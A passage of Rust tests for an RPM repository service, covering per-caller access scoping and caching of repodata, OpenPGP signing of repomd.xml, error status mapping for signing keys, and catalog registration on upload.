                        crate::models::access_scope::AccessScope::Restricted(vec![f.repo_id]);
                    tdh::router_with_auth(super::router(), f.state.clone(), auth)
                }
            };
            let uri = format!("/{}/repodata/{file}", f.repo_key);
            async move {
                let (status, body) = tdh::send(router, tdh::get(uri)).await;
                assert_eq!(
                    status,
                    StatusCode::OK,
                    "{file}: {}",
                    String::from_utf8_lossy(&body)
                );
                body
            }
        };
        let gunzip = |body: Bytes| {
            let mut out = String::new();
            GzDecoder::new(&body[..])
                .read_to_string(&mut out)
                .expect("gunzip");
            out
        };
        struct Docs {
            repomd: Bytes,
            asc: Bytes,
            primary: String,
            filelists: String,
        }
        let docs = |caller: Caller| async move {
            Docs {
                repomd: fetch(caller, "repomd.xml").await,
                asc: fetch(caller, "repomd.xml.asc").await,
                primary: gunzip(fetch(caller, "primary.xml.gz").await),
                filelists: gunzip(fetch(caller, "filelists.xml.gz").await),
            }
        };

        // The widest caller renders first, so a cache keyed only by the
        // virtual would hand its document to everyone after it.
        let insider = docs(Caller::Insider).await;
        let anon = docs(Caller::Anonymous).await;
        let outsider = docs(Caller::Outsider).await;
        // Again, in another order: each caller's set renders byte-identical.
        let anon_again = docs(Caller::Anonymous).await;
        let insider_again = docs(Caller::Insider).await;
        let pubkey_served = fetch(Caller::Anonymous, "repomd.xml.key").await;
        // A repository-scoped token narrows the set below the user's grants.
        let scoped = docs(Caller::Scoped).await;
        let virtual_scoped = docs(Caller::VirtualScoped).await;
        // Revoking the private grant: the caller no longer gets the old set's
        // cached render.
        sqlx::query("DELETE FROM role_assignments WHERE user_id = $1 AND repository_id = $2")
            .bind(f.user_id)
            .bind(private_id)
            .execute(&f.pool)
            .await
            .expect("revoke private grant");
        let revoked = docs(Caller::Insider).await;
        // Response headers: the virtual's documents are caller-dependent, a
        // hosted repository's are not.
        let (_, _, virtual_headers) = tdh::send_with_headers(
            f.router_anon(super::router()),
            tdh::get(format!("/{}/repodata/repomd.xml", f.repo_key)),
        )
        .await;
        let (_, _, hosted_headers) = tdh::send_with_headers(
            f.router_anon(super::router()),
            tdh::get(format!("/{}/repodata/repomd.xml", member_keys[0])),
        )
        .await;

        // Clean up before asserting.
        sqlx::query("DELETE FROM virtual_repo_members WHERE virtual_repo_id = $1")
            .bind(f.repo_id)
            .execute(&f.pool)
            .await
            .ok();
        for id in &members {
            sqlx::query("DELETE FROM artifacts WHERE repository_id = $1")
                .bind(id)
                .execute(&f.pool)
                .await
                .ok();
            sqlx::query("DELETE FROM repositories WHERE id = $1")
                .bind(id)
                .execute(&f.pool)
                .await
                .ok();
        }
        tdh::cleanup_user(&f.pool, outsider_id).await;
        f.teardown().await;

        let names = |d: &Docs| {
            ["pubpkg", "privpkg", "intpkg"].map(|n| {
                let in_primary = d.primary.contains(&format!("<name>{n}</name>"));
                let in_filelists = d.filelists.contains(&format!("name=\"{n}\""));
                assert_eq!(
                    in_primary, in_filelists,
                    "{n}: primary and filelists must describe the same packages"
                );
                in_primary
            })
        };
        assert_eq!(
            names(&anon),
            [true, false, false],
            "#4346: an anonymous caller of a public virtual must see only the public \
             member's package; primary:\n{}",
            anon.primary
        );
        assert!(anon.primary.contains("packages=\"1\""));
        assert_eq!(
            names(&outsider),
            [true, false, true],
            "an authenticated caller without grants sees public + internal members"
        );
        assert_eq!(
            names(&insider),
            [true, true, true],
            "a caller with a grant on the private member sees every member"
        );
        assert_ne!(anon.repomd, insider.repomd);
        assert_ne!(anon.repomd, outsider.repomd);
        assert_ne!(outsider.repomd, insider.repomd);

        // Byte-reproducible per member set, and never the other caller's.
        assert_eq!(anon.repomd, anon_again.repomd);
        assert_eq!(anon.primary, anon_again.primary);
        assert_eq!(insider.repomd, insider_again.repomd);
        assert_eq!(insider.primary, insider_again.primary);

        // Each caller's signature verifies over that caller's repomd.xml, and
        // not over another caller's.
        let pubkey = String::from_utf8(pubkey_served.to_vec()).expect("armored key");
        assert_eq!(pubkey, pubkey_armor);
        for d in [&anon, &outsider, &insider, &anon_again, &insider_again] {
            let asc = String::from_utf8(d.asc.to_vec()).expect("armored signature");
            verify_detached(&pubkey, &d.repomd, &asc)
                .expect("repomd.xml.asc must verify over the caller's own repomd.xml");
        }
        assert_eq!(
            names(&scoped),
            [true, false, false],
            "a repository-scoped token must narrow the member set to its ceiling"
        );
        assert_eq!(
            names(&virtual_scoped),
            [true, true, true],
            "#4559: a token scoped to the virtual reads every member its owner may read"
        );
        assert_eq!(
            names(&revoked),
            [true, false, true],
            "after the private grant is revoked the caller must not get the old set's render"
        );
        assert_eq!(revoked.repomd, outsider.repomd, "same set, same document");
        for d in [&scoped, &revoked] {
            let asc = String::from_utf8(d.asc.to_vec()).expect("armored signature");
            verify_detached(&pubkey, &d.repomd, &asc).expect("own signature verifies");
        }
        assert_eq!(
            virtual_headers
                .get(axum::http::header::CACHE_CONTROL)
                .unwrap(),
            "private"
        );
        assert_eq!(
            virtual_headers.get(axum::http::header::VARY).unwrap(),
            "Authorization, Cookie"
        );
        assert!(hosted_headers.get(axum::http::header::VARY).is_none());
        assert!(hosted_headers
            .get(axum::http::header::CACHE_CONTROL)
            .is_none());
        let anon_asc = String::from_utf8(anon.asc.to_vec()).unwrap();
        assert!(
            verify_detached(&pubkey, &insider.repomd, &anon_asc).is_err(),
            "the anonymous signature must not cover the insider's document"
        );
    }

    // -----------------------------------------------------------------------
    // #2590: repodata must describe only actual `.rpm` packages. The generic
    // chunked upload flow can place arbitrary objects (signature sidecars,
    // checksum files, `.repo` snippets) into an RPM repository; those must
    // not leak into primary.xml/filelists.xml/other.xml, or dnf/yum trip on
    // metadata entries that are not packages.
    // -----------------------------------------------------------------------

    /// Insert an arbitrary (non-`.rpm`) object row into the fixture repo,
    /// mimicking what the generic upload flow stores.
    async fn insert_repo_object(f: &tdh::Fixture, path: &str, name: &str) {
        sqlx::query(
            r#"
            INSERT INTO artifacts (
                repository_id, path, name, size_bytes,
                checksum_sha256, content_type, storage_key, uploaded_by
            )
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
            "#,
        )
        .bind(f.repo_id)
        .bind(path)
        .bind(name)
        .bind(64i64)
        .bind("1111111111111111111111111111111111111111111111111111111111111111")
        .bind("application/octet-stream")
        .bind(path)
        .bind(f.user_id)
        .execute(&f.pool)
        .await
        .expect("insert non-rpm repo object");
    }

    #[tokio::test]
    async fn test_rpm_repodata_excludes_non_rpm_objects() {
        use flate2::read::GzDecoder;
        use std::io::Read;

        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };

        // Two real packages: a binary RPM and a source RPM (both must stay).
        insert_rpm_artifact(&f, "realpkg").await;
        insert_repo_object(&f, "packages/realpkg-1.0-1.src.rpm", "realpkg-src").await;
        // Non-package companions the generic flow can store (all must go).
        insert_repo_object(&f, "packages/realpkg-1.0-1.x86_64.rpm.asc", "realpkg-sig").await;
        insert_repo_object(&f, "realpkg-1.0-1.x86_64.rpm.sha256", "realpkg-sum").await;
        insert_repo_object(&f, "test.repo", "test-repo").await;

        // The query helper itself must only return the package rows.
        let listed = super::collect_repodata_artifacts(&f.pool, &[f.repo_id])
            .await
            .expect("collect_repodata_artifacts");
        let paths: Vec<&str> = listed.iter().map(|a| a.path.as_str()).collect();
        assert_eq!(
            paths,
            vec![
                "packages/realpkg-1.0-1.x86_64.rpm",
                "packages/realpkg-1.0-1.src.rpm",
            ],
            "collect_repodata_artifacts must return only .rpm package objects"
        );

        // End to end: primary.xml must describe exactly the two packages.
        let (status, body) = get_repodata(&f, "primary.xml.gz").await;
        assert_eq!(status, StatusCode::OK);
        let mut decoder = GzDecoder::new(&body[..]);
        let mut primary = String::new();
        decoder
            .read_to_string(&mut primary)
            .expect("decompress primary.xml.gz");

        f.teardown().await;

        assert!(
            primary.contains("packages=\"2\""),
            "primary.xml must count only the .rpm packages, got: {primary}"
        );
        assert!(primary.contains("realpkg-1.0-1.x86_64.rpm"));
        assert!(primary.contains("realpkg-1.0-1.src.rpm"));
        for junk in [".rpm.asc", ".rpm.sha256", "test.repo"] {
            assert!(
                !primary.contains(junk),
                "non-package object {junk} leaked into primary.xml: {primary}"
            );
        }
    }

    // -----------------------------------------------------------------------
    // Advertised-location conformance (#2657 class)
    //
    // The `generate_primary_xml` unit tests prove `<location href>` is emitted
    // as a string; only resolving that href the way dnf/yum does — against the
    // repository base URL (the directory that holds `repodata/`), NOT against
    // the primary.xml document itself — and routing it against the REAL router
    // proves a package the index advertises is actually downloadable. A href
    // that 404s at the download route passes every generator test yet breaks
    // `dnf install`.
    // -----------------------------------------------------------------------

    /// The rpm routes mounted exactly where `api::routes` nests them, so the
    /// repo-base-relative `<location href>` resolves with the `/rpm` prefix.
    fn rpm_mounted_router() -> Router<SharedState> {
        Router::new().nest("/rpm", super::router())
    }

    /// Resolve an advertised URL against the document that carried it and return
    /// the path to request.
    fn resolve_advertised(document_url: &str, advertised: &str) -> String {
        let base = reqwest::Url::parse(document_url).expect("document url");
        let joined = base.join(advertised).expect("advertised url must resolve");
        joined[url::Position::BeforePath..url::Position::AfterQuery].to_string()
    }

    #[tokio::test]
    async fn test_advertised_primary_location_resolves_against_real_router() {
        use flate2::read::GzDecoder;
        use std::io::Read;

        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };

        // Publish a package's bytes under the exact `packages/<file>` path the
        // native RPM PUT stores, so both the index location and the download
        // route agree on it.
        let filename = "realpkg-1.0-1.x86_64.rpm";
        let rpm_bytes: &[u8] = b"fake-rpm-package-bytes-for-advertised-url";
        let repo = f.repo_info("local", None);
        tdh::seed_artifact(
            &f.state,
            &f.pool,
            &repo,
            &format!("packages/{filename}"),
            &format!("packages/{filename}"),
            "realpkg",
            "1.0-1",
            "application/x-rpm",
            bytes::Bytes::from_static(rpm_bytes),
            f.user_id,
        )
        .await;

        // Read the `<location href>` primary.xml advertises for the package.
        let (status, body) = tdh::send(
            f.router_anon(rpm_mounted_router()),
            tdh::get(format!("/rpm/{}/repodata/primary.xml.gz", f.repo_key)),
        )
        .await;
        assert_eq!(status, StatusCode::OK, "primary.xml.gz");
        let mut primary = String::new();
        GzDecoder::new(&body[..])
            .read_to_string(&mut primary)
            .expect("decompress primary.xml.gz");
        let href = primary
            .split_once("<location href=\"")
            .and_then(|(_, rest)| rest.split_once('"'))
            .map(|(h, _)| h.to_string())
            .unwrap_or_default();

        // dnf resolves `<location href>` against the repository base URL — the
        // directory that CONTAINS `repodata/`, not the primary.xml document.
        let repo_base = format!("http://ak.test/rpm/{}/", f.repo_key);
        let (dl_status, dl_body) = if href.is_empty() {
            (StatusCode::NOT_FOUND, bytes::Bytes::new())
        } else {
            let path = resolve_advertised(&repo_base, &href);
            tdh::send(f.router_anon(rpm_mounted_router()), tdh::get(path)).await
        };

        f.teardown().await;

        assert!(
            !href.is_empty(),
            "primary.xml must advertise a <location href>, got: {primary}"
        );
        assert_eq!(
            dl_status,
            StatusCode::OK,
            "the advertised <location href> ({href}) must resolve, not 404"
        );
        assert_eq!(
            &dl_body[..],
            rpm_bytes,
            "the advertised location must serve the published .rpm bytes"
        );
    }

    // -----------------------------------------------------------------------
    // repomd.xml.asc / repomd.xml.key — the OpenPGP contract (#2636)
    //
    // These replace the former `pgp_armor_signature` tests, which asserted the
    // shape of hand-rolled "BEGIN PGP SIGNATURE" markers wrapped around raw
    // base64 PKCS#1 bytes. Those tests passed against output no OpenPGP client
    // could parse: they pinned the bug. What matters is not that the markers
    // are present, but that the bytes between them are a real OpenPGP
    // signature packet that verifies against the key the repo advertises.
    // -----------------------------------------------------------------------

    /// Mint a signing key of `key_type` and attach it to the fixture repo for
    /// metadata signing. Returns the armored public key the repo will serve.
    async fn attach_signing_key(f: &tdh::Fixture, key_type: &str) -> String {
        let svc = SigningService::new(f.pool.clone(), &f.state.config.jwt_secret);
        let key = svc
            .create_key(CreateKeyRequest {
                repository_id: Some(f.repo_id),
                name: format!("rpm-sign-{}", f.repo_key),
                key_type: key_type.to_string(),
                algorithm: "rsa2048".to_string(),
                uid_name: Some("AK RPM".to_string()),
                uid_email: Some("rpm@example.com".to_string()),
                created_by: None,
            })
            .await
            .expect("create signing key");
        svc.update_signing_config(f.repo_id, Some(key.id), true, false, false)
            .await
            .expect("attach signing key");
        key.public_key_pem
    }

    async fn get_repodata(f: &tdh::Fixture, file: &str) -> (StatusCode, Bytes) {
        tdh::send(
            f.router_anon(super::router()),
            tdh::get(format!("/{}/repodata/{}", f.repo_key, file)),
        )
        .await
    }

    /// Give the repo a package, so the metadata epoch is derived from real
    /// repository state rather than the empty-repo fallback.
    async fn insert_rpm_artifact(f: &tdh::Fixture, name: &str) {
        sqlx::query!(
            r#"
            INSERT INTO artifacts (
                repository_id, path, name, version, size_bytes,
                checksum_sha256, content_type, storage_key, uploaded_by
            )
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
            "#,
            f.repo_id,
            format!("packages/{}-1.0-1.x86_64.rpm", name),
            name,
            "1.0-1",
            1024i64,
            "0000000000000000000000000000000000000000000000000000000000000000",
            "application/x-rpm",
            format!("rpm/{}/{}-1.0-1.x86_64.rpm", f.repo_key, name),
            f.user_id,
        )
        .execute(&f.pool)
        .await
        .expect("insert rpm artifact");
    }

    // -----------------------------------------------------------------------
    // #2521 (PF-004): repodata requests must serve a prebuilt cached render.
    // Before the fix every /repodata/* request refetched all live .rpm rows
    // and regenerated + regzipped the whole document set in the request path
    // (repomd.xml built primary/filelists/other/updateinfo just to hash
    // them), so one dnf refresh cost O(repo) work five times over.
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn test_rpm_repodata_warm_requests_serve_one_cached_render() {
        use flate2::read::GzDecoder;
        use std::io::Read;

        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        insert_rpm_artifact(&f, "alpha").await;
        insert_rpm_artifact(&f, "beta").await;

        let renders_before = f.state.rpm_repodata_cache.renders();

        // A full dnf-style refresh (manifest + all three indexes) plus a
        // repeat of the manifest: five requests against unchanged state.
        let (st, repomd) = get_repodata(&f, "repomd.xml").await;
        assert_eq!(st, StatusCode::OK);
        let (st, primary) = get_repodata(&f, "primary.xml.gz").await;
        assert_eq!(st, StatusCode::OK);
        let (st, _filelists) = get_repodata(&f, "filelists.xml.gz").await;
        assert_eq!(st, StatusCode::OK);
        let (st, _other) = get_repodata(&f, "other.xml.gz").await;
        assert_eq!(st, StatusCode::OK);
        let (st, repomd_again) = get_repodata(&f, "repomd.xml").await;
        assert_eq!(st, StatusCode::OK);

        assert_eq!(
            f.state.rpm_repodata_cache.renders() - renders_before,
            1,
            "five repodata requests against unchanged state must cost exactly \
             one O(repo) render"
        );
        assert_eq!(repomd, repomd_again, "warm manifest must be byte-identical");

        // Coherence across the set: the checksum repomd.xml advertises for
        // primary.xml.gz must be the checksum of the bytes the sibling
        // endpoint actually served — they come from the same render.
        let repomd_text = String::from_utf8(repomd.to_vec()).expect("repomd utf8");
        let primary_sha = super::sha256_hex(&primary);
        assert!(
            repomd_text.contains(&primary_sha),
            "repomd.xml must advertise the checksum of the served primary.xml.gz \
             (expected {primary_sha} in: {repomd_text})"
        );

        // A one-artifact mutation rotates the fingerprint: exactly one new
        // render, and the served metadata reflects the change immediately
        // (no TTL window — the fingerprint is revalidated per request).
        insert_rpm_artifact(&f, "gamma").await;
        let (st, primary_after) = get_repodata(&f, "primary.xml.gz").await;
        assert_eq!(st, StatusCode::OK);
        assert_eq!(
            f.state.rpm_repodata_cache.renders() - renders_before,
            2,
            "one artifact mutation must cause exactly one re-render"
        );
        let mut decoder = GzDecoder::new(&primary_after[..]);
        let mut primary_xml = String::new();
        decoder
            .read_to_string(&mut primary_xml)
            .expect("decompress primary.xml.gz");
        assert!(
            primary_xml.contains("<name>gamma</name>"),
            "post-mutation metadata must include the new package: {primary_xml}"
        );
        assert!(
            primary_xml.contains("packages=\"3\""),
            "post-mutation metadata must count all three packages: {primary_xml}"
        );

        f.teardown().await;
    }

    /// The end-to-end contract `dnf repo_gpgcheck=1` enforces: the signature
    /// served at repodata/repomd.xml.asc must be real, CRC24-armored OpenPGP
    /// that verifies over the exact repomd.xml bytes under the key served at
    /// repodata/repomd.xml.key.
    ///
    /// Before #2636 this endpoint returned raw PKCS#1 RSA bytes base64'd
    /// inside hand-rolled "BEGIN PGP SIGNATURE" markers — no packet framing,
    /// no CRC24 — and the key endpoint served an X.509 SPKI PEM.
    #[tokio::test]
    async fn test_repomd_asc_is_verifiable_openpgp_against_advertised_key() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        attach_signing_key(&f, "gpg").await;

        let (xml_status, repomd) = get_repodata(&f, "repomd.xml").await;
        let (asc_status, asc) = get_repodata(&f, "repomd.xml.asc").await;
        let (key_status, pubkey) = get_repodata(&f, "repomd.xml.key").await;
        assert_eq!(xml_status, StatusCode::OK);
        assert_eq!(
            asc_status,
            StatusCode::OK,
            "asc: {}",
            String::from_utf8_lossy(&asc)
        );
        assert_eq!(key_status, StatusCode::OK);

        let asc = String::from_utf8(asc.to_vec()).expect("asc must be ASCII armor");
        let pubkey = String::from_utf8(pubkey.to_vec()).expect("key must be ASCII armor");

        assert!(asc.starts_with("-----BEGIN PGP SIGNATURE-----"));
        assert!(asc.trim_end().ends_with("-----END PGP SIGNATURE-----"));
        // Real armor carries a CRC24 checksum line ("=XXXX") before END; its
        // absence is what made gpg report "invalid packet (ctb=37)".
        assert!(
            asc.lines().any(|l| l.len() == 5 && l.starts_with('=')),
            "armor must carry a CRC24 checksum line; got:\n{}",
            asc
        );
        // Decisive: a parseable signature packet that verifies over the served
        // metadata under the advertised key — exactly what dnf and gpg do.
        StandaloneSignature::from_string(&asc)
            .expect("armor must parse as an OpenPGP signature packet");
        verify_detached(&pubkey, &repomd, &asc)
            .expect("the served signature must verify against the advertised key");

        f.teardown().await;
    }

    /// **The cross-request determinism gate (#2636).**
    ///
    /// A real `dnf` run fetches `repomd.xml` and `repomd.xml.asc` as two
    /// separate requests, and verifies the signature from the second against
    /// the bytes of the first. The two handlers render the document
    /// independently, so anything clock-derived in the render makes them
    /// disagree whenever the fetches straddle a second boundary — `BAD
    /// signature` on a repo nobody touched, at roughly `gap / 1s` probability.
    /// dnf's metadata cache makes it worse: a `repomd.xml` retained from an
    /// earlier run can never match a freshly stamped signature.
    ///
    /// `test_repomd_asc_is_verifiable_openpgp_against_advertised_key` models
    /// the same contract but fetches back-to-back in well under a millisecond,
    /// so it passed ~99.9% of the time even while this was broken — a latent
    /// flake, not a gate. The sleep is what turns it into one.
    #[tokio::test]
    async fn test_repomd_asc_verifies_against_a_repomd_fetched_a_second_earlier() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        attach_signing_key(&f, "gpg").await;
        insert_rpm_artifact(&f, "delayed").await;

        let (xml_status, repomd) = get_repodata(&f, "repomd.xml").await;
        assert_eq!(xml_status, StatusCode::OK);

        // Straddle a second boundary, as any real client trivially does.
        tokio::time::sleep(std::time::Duration::from_millis(1100)).await;

        let (asc_status, asc) = get_repodata(&f, "repomd.xml.asc").await;
        let (key_status, pubkey) = get_repodata(&f, "repomd.xml.key").await;
        assert_eq!(asc_status, StatusCode::OK);
        assert_eq!(key_status, StatusCode::OK);

        let asc = String::from_utf8(asc.to_vec()).expect("asc must be ASCII armor");
        let pubkey = String::from_utf8(pubkey.to_vec()).expect("key must be ASCII armor");

        verify_detached(&pubkey, &repomd, &asc).expect(
            "repomd.xml.asc must verify over the repomd.xml served a second earlier: the \
             signature must cover repository state, not the time the request arrived",
        );

        f.teardown().await;
    }

    /// The same repository state must serve byte-identical `repomd.xml` no
    /// matter when it is asked for — through the real route, over a second
    /// boundary. This is what makes the metadata cacheable and reproducible,
    /// and what lets a cached `repomd.xml` still match a later signature.
    #[tokio::test]
    async fn test_repomd_xml_route_is_byte_stable_over_time() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        insert_rpm_artifact(&f, "stable").await;

        let (_, first) = get_repodata(&f, "repomd.xml").await;
        tokio::time::sleep(std::time::Duration::from_millis(1100)).await;
        let (_, second) = get_repodata(&f, "repomd.xml").await;

        assert_eq!(
            first,
            second,
            "unchanged repo state must serve identical repomd.xml bytes; got:\n{}\n---\n{}",
            String::from_utf8_lossy(&first),
            String::from_utf8_lossy(&second),
        );

        f.teardown().await;
    }

    /// The served signature must not verify over metadata it did not sign.
    #[tokio::test]
    async fn test_repomd_asc_rejects_tampered_metadata() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        attach_signing_key(&f, "gpg").await;

        let (_, repomd) = get_repodata(&f, "repomd.xml").await;
        let (_, asc) = get_repodata(&f, "repomd.xml.asc").await;
        let (_, pubkey) = get_repodata(&f, "repomd.xml.key").await;
        let asc = String::from_utf8(asc.to_vec()).unwrap();
        let pubkey = String::from_utf8(pubkey.to_vec()).unwrap();

        let tampered = String::from_utf8(repomd.to_vec())
            .unwrap()
            .replace("</repomd>", "<data type=\"evil\"></data></repomd>");
        assert!(
            verify_detached(&pubkey, tampered.as_bytes(), &asc).is_err(),
            "a tampered repomd.xml must fail signature verification"
        );

        f.teardown().await;
    }

    /// repodata/repomd.xml.key must serve an importable OpenPGP public key.
    /// `dnf`'s `gpgkey=` and `rpm --import` reject an X.509 SPKI PEM
    /// ("no valid OpenPGP data found").
    #[tokio::test]
    async fn test_repomd_key_serves_importable_openpgp_key() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        attach_signing_key(&f, "gpg").await;

        let (status, body) = get_repodata(&f, "repomd.xml.key").await;
        assert_eq!(status, StatusCode::OK);
        let pubkey = String::from_utf8(body.to_vec()).unwrap();

        assert!(
            pubkey.starts_with("-----BEGIN PGP PUBLIC KEY BLOCK-----"),
            "must be an OpenPGP key block, got: {}",
            pubkey.lines().next().unwrap_or("")
        );
        assert!(
            !pubkey.contains("BEGIN PUBLIC KEY"),
            "must not be an X.509 SubjectPublicKeyInfo PEM"
        );
        let (parsed, _) = SignedPublicKey::from_string(&pubkey).expect("key must parse as OpenPGP");
        parsed.verify().expect("advertised key must self-verify");

        f.teardown().await;
    }

    /// **The regression guard that matters (#2636).**
    ///
    /// A key that claims `key_type=gpg` but whose stored material will not
    /// parse as an OpenPGP secret key (a legacy PEM key predating OpenPGP
    /// support) is a genuine server-side fault: it must surface a real, logged
    /// 500 carrying the cause — never a 404 "No signing key configured for
    /// this repository" while `repomd.xml.key` serves that very key.
    ///
    /// The old path was `sign_data(..).await.unwrap_or(None)`: the `Err`
    /// collapsed into `None`, and the resulting misleading 404 is why this
    /// stayed invisible. Storing X.509 material under `key_type=gpg`
    /// reproduces that load failure past the key-type gate.
    #[tokio::test]
    async fn test_unloadable_signing_key_is_a_loud_500_not_a_misleading_404() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        attach_signing_key(&f, "rsa").await;
        // Present X.509 material as an OpenPGP key: the key type now claims it
        // can sign, so the failure happens where the material is parsed.
        sqlx::query!(
            "UPDATE signing_keys SET key_type = 'gpg' WHERE repository_id = $1",
            f.repo_id
        )
        .execute(&f.pool)
        .await
        .expect("force key_type=gpg");

        let (asc_status, body) = get_repodata(&f, "repomd.xml.asc").await;

        assert_eq!(
            asc_status,
            StatusCode::INTERNAL_SERVER_ERROR,
            "a key that cannot be loaded is a server fault, and must not be swallowed \
             into 404 'No signing key configured'",
        );
        let body = String::from_utf8_lossy(&body);
        assert!(
            body.contains("Failed to sign repomd.xml"),
            "the response must carry the real cause, got: {}",
            body
        );

        f.teardown().await;
    }

    /// An `rsa` key — the *default* `key_type` — cannot produce an OpenPGP
    /// chain, so both signing endpoints refuse with **409 Conflict**: the
    /// repository's signing config conflicts with what these endpoints must
    /// serve. Distinctly not 404 (the repo *does* advertise a key) and
    /// distinctly not 500 (nothing is broken server-side).
    ///
    /// The status is load-bearing: these routes are anonymous, so every `dnf`
    /// poll of a misconfigured repo lands here. A 500 would let an
    /// unauthenticated client drive unbounded ERROR logs and 500-rate alerts —
    /// paging an on-call engineer for an operator config mistake.
    #[tokio::test]
    async fn test_rsa_key_is_a_409_conflict_on_both_signing_endpoints() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        attach_signing_key(&f, "rsa").await;

        let (asc_status, asc_body) = get_repodata(&f, "repomd.xml.asc").await;
        let (key_status, _) = get_repodata(&f, "repomd.xml.key").await;

        assert_eq!(
            asc_status,
            StatusCode::CONFLICT,
            "an unsignable key type is a config conflict, not a server error",
        );
        assert_eq!(
            key_status,
            StatusCode::CONFLICT,
            "the repo must not advertise a key it can never sign with",
        );
        let asc_body = String::from_utf8_lossy(&asc_body);
        assert!(
            asc_body.contains("key_type='gpg'"),
            "the response must name the fix, got: {}",
            asc_body
        );

        f.teardown().await;
    }

    /// A repo with genuinely no signing key still 404s: the 500 above is a
    /// signing *failure*, not a missing configuration. Keeps the two distinct.
    #[tokio::test]
    async fn test_repo_without_signing_key_still_404s() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };

        let (asc_status, _) = get_repodata(&f, "repomd.xml.asc").await;
        let (key_status, _) = get_repodata(&f, "repomd.xml.key").await;
        assert_eq!(asc_status, StatusCode::NOT_FOUND);
        assert_eq!(key_status, StatusCode::NOT_FOUND);

        f.teardown().await;
    }

    /// The 404-vs-500 decision itself, as a pure mapping (#2636). A *missing*
    /// key is a client-visible 404; a key that fails to load is a loud 500
    /// carrying the real error. Collapsing the second into the first is the
    /// bug class this guards.
    #[test]
    fn test_require_signing_key_separates_missing_from_broken() {
        let missing = require_signing_key(Ok(None)).expect_err("None must be an error response");
        assert_eq!(missing.status(), StatusCode::NOT_FOUND);

        let broken = require_signing_key(Err(crate::error::AppError::Internal(
            "Failed to parse OpenPGP private key".to_string(),
        )))
        .expect_err("Err must be an error response");
        assert_eq!(
            broken.status(),
            StatusCode::INTERNAL_SERVER_ERROR,
            "a key-load failure must be a loud 500, never a 404 'not configured'"
        );
    }

    fn key_of_type(key_type: &str) -> crate::models::signing_key::SigningKey {
        crate::models::signing_key::SigningKey {
            id: uuid::Uuid::new_v4(),
            repository_id: None,
            name: "k".to_string(),
            key_type: key_type.to_string(),
            fingerprint: None,
            key_id: None,
            public_key_pem: String::new(),
            private_key_enc: Vec::new(),
            algorithm: "rsa2048".to_string(),
            uid_name: None,
            uid_email: None,
            expires_at: None,
            is_active: true,
            created_at: test_updated_at(),
            created_by: None,
            rotated_from: None,
            last_used_at: None,
        }
    }

    /// The 409-vs-500 decision as a pure mapping (#2636): a key type that can
    /// never sign OpenPGP is an operator config conflict, not a server fault.
    #[test]
    fn test_require_openpgp_capable_key_separates_conflict_from_capable() {
        assert!(
            require_openpgp_capable_key(key_of_type("gpg")).is_ok(),
            "a gpg key must be accepted"
        );

        let conflict = require_openpgp_capable_key(key_of_type("rsa"))
            .expect_err("an rsa key cannot produce an OpenPGP chain");
        assert_eq!(
            conflict.status(),
            StatusCode::CONFLICT,
            "an unsignable key type must be a 409 an anonymous client cannot turn into \
             an ERROR-log/500-alert amplifier",
        );
    }
}

// ---------------------------------------------------------------------------
// #3659: the native publish path must register the package catalog row.
// ---------------------------------------------------------------------------

#[cfg(ak_test_shard = "handlers-2")]
#[cfg(test)]
mod catalog_registration_tests {
    use crate::api::handlers::test_db_helpers as tdh;

    /// An RPM upload must register the catalog row under the package's NEVRA
    /// name and `version-release`, not the uploaded filename.
    #[tokio::test]
    async fn rpm_upload_registers_catalog_row() {
        let Some(fx) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let (status, body) = tdh::send(
            fx.router_with_auth(super::router()),
            tdh::put(
                format!("/{}/packages/catalogpkg-1.0-2.x86_64.rpm", fx.repo_key),
                bytes::Bytes::from_static(b"not-a-real-rpm-but-stored-verbatim"),
            ),
        )
        .await;
        assert!(
            status.is_success(),
            "rpm upload failed: {status} {}",
            String::from_utf8_lossy(&body)
        );

        let row = tdh::catalog_row(&fx.pool, fx.repo_id, "catalogpkg").await;
        fx.teardown().await;

        let row = row.expect("an rpm upload must write a packages row (#3659)");
        assert_eq!(row.version, "1.0-2");
        assert_eq!(row.versions, vec!["1.0-2".to_string()]);
    }
}

/// Scriptlet extraction (#4033). The RPM is assembled in-test — lead,
/// empty signature header, and a main header whose index entries are all
/// `STRING` tags — so no binary package is checked in.
#[cfg(ak_test_shard = "handlers-2")]
#[cfg(test)]
mod scriptlet_tests {
    use super::*;
    use crate::services::conda_scripts::{analyze_script, ScriptSeverity};

    const RPMTAG_NAME: u32 = 1000;
    const RPMTAG_VERSION: u32 = 1001;
    const RPMTAG_PREIN: u32 = 1023;
    const RPMTAG_POSTIN: u32 = 1024;
    const RPMTAG_PREUN: u32 = 1025;
    const RPMTAG_POSTUN: u32 = 1026;
    const RPMTAG_PREINPROG: u32 = 1085;
    const RPMTAG_POSTINPROG: u32 = 1086;
    const RPMTAG_PREUNPROG: u32 = 1087;
    const RPMTAG_POSTUNPROG: u32 = 1088;

    /// Lead + empty signature header; the main header, if any, goes at 112.
    fn rpm_lead_and_signature() -> Vec<u8> {
        let mut data = vec![0u8; 112];
        data[..4].copy_from_slice(&[0xed, 0xab, 0xee, 0xdb]);
        data[4] = 3;
        data[10..14].copy_from_slice(b"pkg\0");
        data[96..99].copy_from_slice(&[0x8e, 0xad, 0xe8]);
        data[99] = 1;
        data
    }

    /// A header section whose entries are all NUL-terminated `STRING` tags.
    fn header_section(tags: &[(u32, &str)]) -> Vec<u8> {
        let mut index = Vec::new();
        let mut store = Vec::new();
        for (tag, value) in tags {
            index.extend_from_slice(&tag.to_be_bytes());
            index.extend_from_slice(&6u32.to_be_bytes()); // RPM_STRING_TYPE
